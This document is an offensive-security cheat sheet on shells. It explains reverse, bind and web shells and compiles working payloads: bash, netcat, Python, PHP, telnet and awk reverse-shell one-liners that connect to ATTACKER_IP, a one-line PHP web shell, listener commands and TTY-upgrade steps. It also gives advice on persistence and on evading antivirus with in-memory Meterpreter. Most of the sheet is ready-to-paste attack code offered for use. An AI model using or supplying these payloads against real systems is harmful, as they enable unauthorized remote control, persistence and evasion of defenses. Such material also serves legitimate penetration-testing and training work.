# Shells Overview: Summary & Cheat Sheet

Reference:

- [Online Reverse Shell Generator](https://www.revshells.com/)
- [GitHub: reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator)
- [Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet),

### 1. Types of Shells

A shell is the interface used to interact with an operating system. In a security context, there are three primary types:

- **Reverse Shell (RS)**: The compromised target connects back to the attacker's machine.
  - _Context_: Most common; bypasses inbound firewall restrictions. The attacker must "listen" for the incoming connection.
- **Bind Shell**: The attacker connects to a specific port opened on the compromised target.
  - _Context_: The victim acts as the listener. Use this when the attacker is behind a strict NAT or cannot receive incoming connections. Often blocked by firewalls.
- **Web Shell**: A script (PHP, ASP, JSP, etc.) uploaded to a web server allowing command execution via HTTP.
  - _Context_: Operates over ports 80/443; persistent until the file is deleted.

### 2. Establishing Shell Connections (Listeners)

#### A. Bind Shell Listener (Runs on the TARGET)

The target opens a port and "binds" a shell to it.

- **Netcat**: `nc -lvnp <port> -e /bin/bash`

#### B. Reverse Shell Listener (Runs on the ATTACKER)

The attacker waits to "catch" the connection from the target.

- **Netcat (Standard)**: `nc -lvnp <port_number>`, `-l`: Listen mode, `-v`: Verbose output, `-n`: Do not resolve DNS (faster), `-p`: Specify the port number.
- **Rlwrap (Adds History/Arrows)**: `rlwrap nc -lvnp <port_number>` This wraps nc with rlwrap, allowing the use of features like readline-style editing, arrow keys and history.
- **Ncat (Supports SSL)**: `ncat --ssl -lvnp <port_number>`
- **Socat (Stable TTY)**: `socat -d -d TCP-LISTEN:<port_number> STDOUT` Create a socket connection between two data sources.

#### C. Connecting to a Bind Shell (From the ATTACKER)

- **Netcat**: `nc -nv <target_ip> <target_port>`

### 3. Shell Payloads (Target Side)

#### Reverse Shell One-Liners

- **Normal Bash**: `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 `
- **Bash (Read Line)**: `exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done` Replace `exec` with `bash`
- **Bash (File Descriptor 196)**: `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196`
- **Pipe RS (Reliable on Linux)**: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP PORT >/tmp/f`
- **Netcat (with -e flag)**: `nc ATTACKER_IP PORT -e /bin/bash`
- **BusyBox**: `busybox nc ATTACKER_IP PORT -e sh`

#### Python Reverse Shells

- **Python (Standard)**: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
- **Python (Env Vars)**: `export RHOST="ATTACKER_IP"; export RPORT=PORT; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`
- **Python (Subprocess)**: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

#### PHP Reverse Shells

- **PHP (Standard)**: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("sh <&3 >&3 2>&3");'`
- **PHP (Alternative Functions)**: Replace `exec` with `shell_exec`, `passthru`, or `system`.
- **PHP (popen)**: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("sh <&3 >&3 2>&3", "r");'`

#### Others

- **Telnet**: `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | sh 1>$TF`
- **AWK**: `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`

### 4. Web Shells

Web shells are used when file upload or command injection vulnerabilities exist. One the file has been uploaded, you need to visit the page that loads the file.

- **Function**: They act as a medium between the user and the OS through the web server.
- **PHP Basic**: `<?php system($_GET['cmd']); ?>`
  - _Usage_: Navigating to `http://target.com/shell.php?cmd=whoami` will execute the `whoami` command on the server and display the result in the browser.
- **[p0wny-shell](https://github.com/flozz/p0wny-shell)**: Minimalistic single-file PHP shell.
- **[b374k shell](https://github.com/b374k/b374k)**: Feature-rich (file management, SQL).
- **[c99 shell](https://www.r57shell.net/single.php?id=13)**: Robust, well-known management shell.
- **[More Shells](https://www.r57shell.net/index.php)**

### 5. Summary of Key Differences

| Feature               | **Reverse Shell**                                 | **Bind Shell**                        | **Web Shell**                                |
| :-------------------- | :------------------------------------------------ | :------------------------------------ | :------------------------------------------- |
| **Connection Flow**   | Target $\rightarrow$ Attacker                     | Attacker $\rightarrow$ Target         | Attacker $\rightarrow$ Web Server            |
| **Initiator**         | Target Machine (Victim)                           | Attacker Machine                      | Attacker via Browser/HTTP                    |
| **Listener Location** | Attacker Machine                                  | Target Machine                        | Web Server (Software)                        |
| **Firewall Status**   | Bypasses Strict Inbound (Egress)                  | Often Blocked (Ingress)               | Bypasses (Uses Port 80/443)                  |
| **Complexity**        | Requires listener setup                           | Requires open port, Firewall blockage | Requires script/file upload code exec. vuln. |
| **Persistence**       | Session-based                                     | Session-based                         | Persistent (File stays on server)            |
| **Common Listener**   | `nc -lvnp <port>`                                 | `nc -lvnp <port> -e /bin/sh`          | N/A (Handled by Apache/Nginx)                |
| **Connection Method** | Wait for incoming, Automatically Catches incoming | `nc <target_ip> <port>`               | `curl http://target.com/s.php`               |
| **Typical Payload**   | `bash -i >& /dev/tcp/IP/PORT 0>&1`                | `msfvenom -p windows/shell_bind_tcp`  | `<?php system($_GET['cmd']); ?>`             |

### 6. Shell Interactivity

- **Non-Interactive**: Basic command-response loop. Cannot handle `top`, `nano`, `sudo` prompts, or SSH.
- **Interactive/TTY**: Full terminal experience (Tab completion, history, etc.).
  - **Upgrade Trick**:
    1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    2. `CTRL+Z` (Background shell)
    3. `stty raw -echo; fg`
    4. `export TERM=xterm`

### 7. Strategic Tool & Language Selection

Use these tables to decide which specific tool or language fits your current environment and obstacles.

#### A. Payload Language & Tool Comparison

_Which code should you run on the target?_

| Language/Tool   | Best For          | Pros                                                              | Cons                                                                             |
| :-------------- | :---------------- | :---------------------------------------------------------------- | :------------------------------------------------------------------------------- |
| **Bash**        | Linux / Unix      | Fast to type; no special software; standard on nearly all Linux.  | Noisy in logs; non-interactive; breaks easily on complex commands.               |
| **Python**      | Linux / Windows   | Cross-platform; excellent for TTY upgrades; very stable.          | Requires Python installed (common on Linux, rare on Windows).                    |
| **PHP**         | Web Servers       | Bypasses firewalls via web ports; remains as a persistent file.   | Limited to web-user permissions (`www-data`); often blocked by security configs. |
| **Netcat (nc)** | Legacy Targets    | Simple if the `-e` flag is available; tiny footprint.             | `-e` flag is often removed for security; traffic is unencrypted (plain text).    |
| **MSFvenom**    | Advanced Exploits | Supports encryption, encoding, and staged payloads (Meterpreter). | Larger file size; more likely to be flagged by Antivirus (AV).                   |
| **Socat**       | Advanced Linux    | Immediate full TTY (arrows, tab-completion, window resizing).     | Complex syntax; rarely pre-installed on the target machine.                      |

#### B. Listener Tool Comparison

_Which "catcher" should you use on your machine?_

| Tool                  | Interactivity | Best For                 | Key Benefit                                                        |
| :-------------------- | :------------ | :----------------------- | :----------------------------------------------------------------- |
| **Netcat (nc)**       | **Low**       | Quick, simple tasks.     | The "Universal" tool; found on almost every attacking OS.          |
| **Rlwrap + NC**       | **Medium**    | Standard Reverse Shells. | Adds **Command History** and **Arrow Keys** to a basic shell.      |
| **Socat**             | **High**      | Stable Linux sessions.   | Supports `Ctrl+C` and terminal resizing without killing the shell. |
| **Ncat**              | **Medium**    | Stealthy/Secure tasks.   | Supports **SSL Encryption** to hide traffic from network sensors.  |
| **MSF Multi/Handler** | **Very High** | Meterpreter / Staging.   | Manages multiple sessions and supports advanced post-exploitation. |

#### C. Decision Matrix: Choosing the Right Shell

_Based on the obstacles you face._

| If you face this obstacle...       | Use this Shell Type      | Why?                                                                  |
| :--------------------------------- | :----------------------- | :-------------------------------------------------------------------- |
| **Strict Inbound Firewall**        | **Reverse Shell**        | Connection goes _out_ from the target, which is usually allowed.      |
| **Strict Outbound Firewall**       | **Bind Shell**           | If the target can't "call home," you must connect to its open port.   |
| **Attacker has no Public IP**      | **Bind Shell**           | You connect to the target; they don't need to find your IP.           |
| **Need to survive a Reboot**       | **Web Shell**            | The script stays on the disk even if the server restarts.             |
| **Need to bypass Antivirus**       | **Meterpreter (Staged)** | Loads the main "malicious" code directly into RAM, avoiding the disk. |
| **Need full terminal (sudo/nano)** | **Socat / Python TTY**   | Necessary for interactive prompts that standard shells can't handle.  |

**Summary Recommendation**

- **For most Linux boxes**: Start with a Netcat Reverse Shell (wrapped in `rlwrap`) and then upgrade it using the Python TTY trick.
- **For Web Servers**: Upload a simple PHP shell first to browse the system, then use it to trigger a Reverse Shell for better control.
- **For Windows**: Use MSFvenom to create a Meterpreter Reverse TCP executable for maximum post-exploitation power.
